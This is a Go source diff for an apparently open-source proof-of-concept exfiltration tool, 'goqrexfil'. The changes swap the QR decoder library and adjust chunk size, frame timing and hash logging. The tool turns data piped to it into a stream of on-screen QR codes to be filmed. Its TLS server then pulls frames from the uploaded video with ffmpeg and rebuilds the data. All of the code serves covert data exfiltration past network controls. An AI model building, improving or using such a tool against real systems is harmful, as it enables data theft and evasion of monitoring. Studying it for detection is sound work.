@@ -6,16 +6,8 @@ import (
 	"encoding/hex"
 	"flag"
 	"fmt"
-	"github.com/boombuler/barcode"
-	"github.com/boombuler/barcode/qr"
-	"github.com/gin-gonic/gin"
-	"github.com/kjk/smaz"
-	"github.com/makiuchi-d/gozxing"
-	"github.com/makiuchi-d/gozxing/qrcode"
-	log "github.com/sirupsen/logrus"
-	"github.com/zserge/lorca"
-	"golang.org/x/crypto/blake2b"
 	"image"
+	"image/jpeg"
 	"image/png"
 	"io"
 	"io/ioutil"
@@ -26,15 +18,25 @@ import (
 	"path/filepath"
 	"strings"
 	"time"
+
+	"github.com/kjk/smaz"
+
+	"github.com/boombuler/barcode"
+	"github.com/boombuler/barcode/qr"
+	"github.com/gin-gonic/gin"
+	goqr "github.com/liyue201/goqr"
+	log "github.com/sirupsen/logrus"
+	"github.com/zserge/lorca"
+	"golang.org/x/crypto/blake2b"
 )
 
 const port = "9999"
 const video = "./public/video.mp4"
 const ffmpeg = "/opt/homebrew/bin/ffmpeg"
 const retrieved = "./payload/payload.bin"
-const maxBytes = 260
+const maxBytes = 230
 const startTimer = 3
-const msBetweenFrames = 400
+const msBetweenFrames = 500
 
 var clear map[string]func()
 
@@ -69,15 +71,15 @@ func init() {
 // RenderQR returns a QR code string from a string
 func RenderQR(chunk string) string {
 	qrCode, _ := qr.Encode(chunk, qr.H, qr.Unicode)
-	qrCode, _ = barcode.Scale(qrCode, 600, 600)
+	qrCode, _ = barcode.Scale(qrCode, 480, 480)
 	var buff bytes.Buffer
 	err := png.Encode(&buff, qrCode)
 	if err != nil {
 		log.Fatal(err)
 	}
 	encodedString := base64.StdEncoding.EncodeToString(buff.Bytes())
-	h := blake2b.Sum512([]byte(encodedString))
-	log.Info("Checksum ", hex.EncodeToString(h[:]))
+	h := blake2b.Sum256([]byte(chunk))
+	fmt.Println("[*] Creating QR code\n   DATA_HASH =", hex.EncodeToString(h[:])) //, "\n    Payload =", []byte(chunk))
 	return "<img src=\"data:image/png;base64," + encodedString + "\" />"
 }
 
@@ -104,20 +106,23 @@ func payloadInChunks(longString string, chunkSize int) []string {
 
 // DecodeQRCode returns a string with the base64 encoded payload from the QR code
 func DecodeQRCode(img image.Image) string {
-	// prepare BinaryBitmap
-	bmp, e := gozxing.NewBinaryBitmapFromImage(img)
-	if e != nil {
-		log.Info("Error preparing bitmap:", e)
-	}
-
-	// decode image
-	qrReader := qrcode.NewQRCodeReader()
-	result, e := qrReader.Decode(bmp, nil)
-	if e != nil {
-		//log.Info("Error decoding data:", e)
+	buf := new(bytes.Buffer)
+	err := jpeg.Encode(buf, img, nil)
+	img, _, err = image.Decode(bytes.NewReader(buf.Bytes()))
+	if err != nil {
+		log.Error("image.Decode error: %v\n", err)
 		return ""
 	}
-	return result.GetText()
+	qrCodes, err := goqr.Recognize(img)
+	if err != nil {
+		// log.Error("Recognize failed: %v\n", err)
+		return ""
+	}
+	var payload string
+	for _, qrCode := range qrCodes {
+		payload = payload + string(qrCode.Payload)
+	}
+	return payload
 }
 
 /* retrievePayload is the main function that will take the uploaded video, extract frames and call DecodeQRCode to get the payload
@@ -135,8 +140,8 @@ func retrievePayload() bool {
 		}
 	}
 	cmd := exec.Command(ffmpeg, "-i", "./public/video.mp4",
-		"-loglevel", "error",
-		"-r", "1", "./public/%03d.png")
+		"-loglevel", "error", // "-r", "10",
+		"./public/%03d.png")
 	cmd.Stderr = os.Stderr
 	err = cmd.Run()
 	if err != nil {
@@ -146,18 +151,14 @@ func retrievePayload() bool {
 	// Now we need to parse all frames, find if a QR Code is present and extract data from it
 	var payload string
 	matches, _ := filepath.Glob("./public/*png")
-	fmt.Println("[***] Extracting data from ", len(matches), " frames, skipping duplicates")
+	fmt.Println("[***] Extracting data from", len(matches), "frames, skipping duplicates")
 	for _, match := range matches {
-		fmt.Println("[*] Retrieving image from file", match)
 		f, _ := os.Open(match)
 		img, _, _ := image.Decode(f)
-		err := f.Close()
-		if err != nil {
-			return false
-		}
+		_ = f.Close()
 		buff := DecodeQRCode(img)
 		if len(buff) == 0 {
-			fmt.Println("\tEmpty ... Skipping")
+			//fmt.Println("[*] Retrieving image from file", match, "- No QR code/data, skipping.")
 		} else {
 			result := buff
 			if len(result) > 0 {
@@ -165,8 +166,10 @@ func retrievePayload() bool {
 				duplicate := strings.Contains(payload, result)
 				if duplicate == false {
 					payload += result
-					h := blake2b.Sum512([]byte(payload))
-					fmt.Println("\tPayload retrieved hash ", hex.EncodeToString(h[:]))
+					h := blake2b.Sum256([]byte(result))
+					// fmt.Println("[*] Creating QRcode,\n   DATA_HASH ="
+					fmt.Println("[*] Retrieving data from ", match, ".\n     DATA_HASH =", hex.EncodeToString(h[:])) //,
+					// "\n    Payload =", []byte(result))
 				}
 			}
 		}
@@ -181,8 +184,8 @@ func retrievePayload() bool {
 		if err != nil {
 			log.Fatal(err)
 		}
-		h := blake2b.Sum512(content)
-		fmt.Println("\n[*] Payload saved as ", retrieved, " ( Checksum", hex.EncodeToString(h[:]), ")")
+		h := blake2b.Sum256(content)
+		fmt.Println("[*] Payload saved as ", retrieved, "\nPayload hash", hex.EncodeToString(h[:]))
 	} else {
 		log.Info("!!! No Payload retrieved from analyzed frames")
 		result = false
@@ -297,7 +300,7 @@ func main() {
 		server()
 	} else if *isClient {
 		// Client mode (allowing video recording of QR codes)
-		fmt.Println("[*] Client mode: ON")
+		fmt.Println("[***] Client mode: ON")
 		writeText, err := os.Open(os.DevNull)
 		if err != nil {
 			log.Fatalf("failed to open a null device: %s", err)
@@ -305,7 +308,10 @@ func main() {
 		defer writeText.Close()
 		io.WriteString(writeText, "Write Text")
 
+		fmt.Println("[*] Loading payload from file")
 		readText, err := ioutil.ReadAll(os.Stdin)
+		h := blake2b.Sum256([]byte(readText))
+		fmt.Println("Plaintext hash", hex.EncodeToString(h[:]))
 		if err != nil {
 			log.Fatalf("failed to open a null device: %s", err)
 		}
@@ -316,36 +322,37 @@ func main() {
 		compressed := smaz.Encode(nil, readText)
 		encoded := base64.StdEncoding.EncodeToString(compressed)
 		chunks := payloadInChunks(encoded, maxBytes)
-		fmt.Println("[*] Payload is in ", len(chunks), " chunks")
-		fmt.Println("**** Start your video, displaying in >", startTimer, "< seconds ****")
+		fmt.Println("\n[*] Payload will be in", len(chunks), "chunks")
+		fmt.Println("[***] Start your video, displaying in >", startTimer, "< seconds ****")
+		fmt.Println()
 		time.Sleep(3 * time.Second)
 		// Create UI with basic HTML passed via data URI
-		ui, error := lorca.New("data:text/html,"+url.PathEscape(`
+		const html = `
 		<html>
-			<head><title>qrexfil PoC</title></head>
+			<head><title>goqrexfil PoC</title></head>
 			<h1>QR codes streaming starting now</h1>
 			</body>
 		</html>
-		`), "", 725, 725)
+		`
+		ui, error := lorca.New("data:text/html,"+url.PathEscape(html), "", 600, 600)
 		if error != nil {
 			log.Fatal("lorca.New():", err)
 		}
+		defer ui.Close()
 
 		// Iterate on chunks, generate QR code and display it in UI
 		for _, chunk := range chunks {
 			time.Sleep(msBetweenFrames * time.Millisecond)
-			imgSrc := RenderQR(chunk)
-			ui.Load("data:text/html," + url.PathEscape(`<html><body><center>`+imgSrc+`</center></body></html>`))
+			ui.Load("data:text/html," + url.PathEscape(`<html><body><center>`+RenderQR(chunk)+`</center></body></html>`))
 		}
 		time.Sleep(msBetweenFrames * time.Millisecond)
 		ui.Load("data:text/html," + url.PathEscape(`<html><body><h1>Done</h1></body></html>`))
 		<-ui.Done()
-		ui.Close()
 
 	} else {
 		fmt.Println("Please use client or server mode:")
 		fmt.Println("echo \"data to send\" | ./qr --client\t\tTo use in client mode")
-		fmt.Println("./qr --server\t\t\t\t\tTo use as a TLS listener to receive video and extract data")
+		fmt.Println("./goqrexfil --server\t\t\t\t\tTo use as a TLS listener to receive video and extract data")
 		fmt.Println()
 		os.Exit(1)
 	}
